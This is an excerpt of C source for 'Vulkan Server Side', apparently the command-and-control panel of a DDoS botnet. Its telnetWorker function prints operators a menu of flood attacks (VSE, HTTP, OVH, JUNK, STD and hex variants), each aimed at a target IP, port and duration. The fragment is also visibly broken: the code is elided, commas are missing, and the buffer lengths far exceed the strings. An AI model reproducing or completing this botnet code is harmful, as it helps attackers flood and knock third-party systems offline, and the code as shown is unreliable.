/*
Title: Vulkan Server Side
Made By: ~B1NARY~ X Arteon
Made Date: 7-1-18
Edit Date 17-10-20
...
void *telnetWorker(void *sock)
{
        ...
        if(send(thefd, "VATK - !* VSE IP PORT SEC\r\n", 900, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "HTATK - !* HTTP IP PORT SEC\r\n", 901 MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "HT2ATK - !* HTTPtwo IP PORT SEC\r\n", 902 MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "HTXATK - !* HTTPHEX IP PORT SEC\r\n", 903 MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "OATK - !* OVH IP PORT SEC\r\n", 904 MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "JATK - !* JUNK IP PORT SEC\r\n", 905 MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "STATK - !* STD IP PORT SEC\r\n", 906 MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "STXATK - !* STD HEX IP PORT SEC\r\n", 907 MSG_NOSIGNAL) == -1) goto end;
			}
